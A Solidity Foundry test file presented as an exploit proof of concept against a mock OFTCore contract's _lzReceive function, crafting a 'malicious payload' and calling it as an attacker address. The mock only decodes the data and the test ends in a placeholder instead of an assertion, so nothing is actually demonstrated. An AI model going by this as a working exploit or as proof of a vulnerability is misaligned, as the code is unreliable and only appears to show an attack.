// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for OFTCore contract
interface IOFTCore {
    function _lzReceive(bytes calldata _message) external;
}

contract ExploitTest is Test {
    IOFTCore oftCore;
    address attacker;

    function setUp() public {
        // Deploy the OFTCore contract
        oftCore = IOFTCore(address(new MockOFTCore()));

        // Set up attacker address
        attacker = address(0xdeadbeef);

        // Fund attacker with some ETH for gas
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Craft a malicious payload
        bytes memory maliciousPayload = abi.encodePacked(
            uint256(1), // Some valid initial data
            uint256(0), // Manipulated data to shift arrays
            bytes32(uint256(0xdeadbeef)) // Malicious appended bytes
        );

        // Step 2: Impersonate the attacker
        vm.prank(attacker);

        // Step 3: Call the vulnerable _lzReceive function with the malicious payload
        oftCore._lzReceive(maliciousPayload);

        // Assert the vulnerability
        // Check if the attacker's balance increased or unauthorized actions occurred
        // This is a placeholder assertion, replace with actual checks based on the vulnerability impact
        // e.g., assertGt(attacker.balance, initialBalance);
    }
}

// Mock implementation of the OFTCore contract for testing
contract MockOFTCore is IOFTCore {
    function _lzReceive(bytes calldata _message) external override {
        // Simulate the vulnerable decoding process
        // This is a simplified version for demonstration purposes
        (uint256 validData, uint256 manipulatedData, bytes32 maliciousBytes) = abi.decode(_message, (uint256, uint256, bytes32));

        // Process the decoded data
        // Vulnerability: No strict validation of the payload structure
    }
}